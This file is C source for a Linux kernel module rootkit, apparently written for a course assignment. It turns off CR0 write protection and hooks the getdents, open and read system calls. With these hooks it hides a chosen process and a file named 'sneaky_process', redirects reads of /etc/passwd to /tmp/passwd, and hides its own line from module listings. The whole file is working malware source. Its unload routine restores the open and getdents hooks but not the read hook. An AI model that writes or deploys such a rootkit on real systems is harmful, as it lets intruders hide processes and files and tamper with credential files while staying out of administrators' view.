#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>

#define PATHNAME_MAX 256

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kai Zhang");

struct linux_dirent {
  long d_ino;
  off_t d_off;
  unsigned short d_reclen;
  char d_name[];
};

// Module parameters
static char *sneaky_pid = "";
module_param(sneaky_pid, charp, 0000);
MODULE_PARM_DESC(sneaky_pid,
                 "The pid of the attack program which load this module");

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

// Function pointer will be used to save address of original 'getdents' syscall.
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count);

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect to find its arguments on the stack (not in registers).
// This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);

// Function pointer will be used to save address of original 'read' syscall.
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

// Define our new sneaky version of the "getdents" syscall
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                   unsigned int count) {
  int numBytes;
  int pos;

  // Call the original 'getdents'
  numBytes = original_getdents(fd, dirp, count);

  pos = 0;

  while (pos < numBytes) {
    struct linux_dirent *curr_dirp;
    int len;
    char d_type;

    curr_dirp = (struct linux_dirent *)((char *)dirp + pos);
    len = curr_dirp->d_reclen;
    d_type = *((char *)curr_dirp + len - 1);

    // Process ID or regular file named "sneaky_process" found
    if (strcmp(curr_dirp->d_name, sneaky_pid) == 0 ||
        (strcmp(curr_dirp->d_name, "sneaky_process") == 0 &&
         d_type == DT_REG)) {
      char *next_dirp;
      size_t remaining_len;

      // Remove the current linux_dirent struct
      next_dirp = (char *)curr_dirp + len;
      remaining_len = numBytes - pos - len;
      memcpy(curr_dirp, next_dirp, remaining_len);

      return numBytes - len;
    }

    // Not found
    pos += len;
  }

  return numBytes;
}

// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  if (strcmp(pathname, "/etc/passwd") == 0) {
    if (copy_to_user((void *)pathname, "/tmp/passwd", 12) != 0) {
      printk(KERN_INFO "Redicect /etc/passwd to /tmp/passwd failed.\n");
    }
  }
  return original_call(pathname, flags);
}

// Define our new sneaky version of the "read" syscall
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  size_t numBytes;
  char *begin;
  char *end;
  size_t len;
  size_t remaining_len;

  // Call the original 'getdents'
  numBytes = original_read(fd, buf, count);
  if (numBytes == -1) {
    return -1;
  }

  begin = strstr(buf, "sneaky_mod ");
  if (begin == NULL) { // Not found
    return numBytes;
  }

  // Found, then remove the line
  end = strchr(begin, '\n');
  len = end - begin + 1;
  remaining_len = numBytes - (end - (char *)buf + 1);

  // Found, then remove the line
  memcpy(begin, end + 1, remaining_len);
  return numBytes - len;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // Save away the original 'getdents' system call.
  // Then overwrite its address in the system call
  // table with the function address of our new code.
  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_call = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  // Save away the original 'read' system call.
  // Then overwrite its address in the system call
  // table with the function address of our new code.
  original_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // Restore the original 'getdents' system call function address.
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
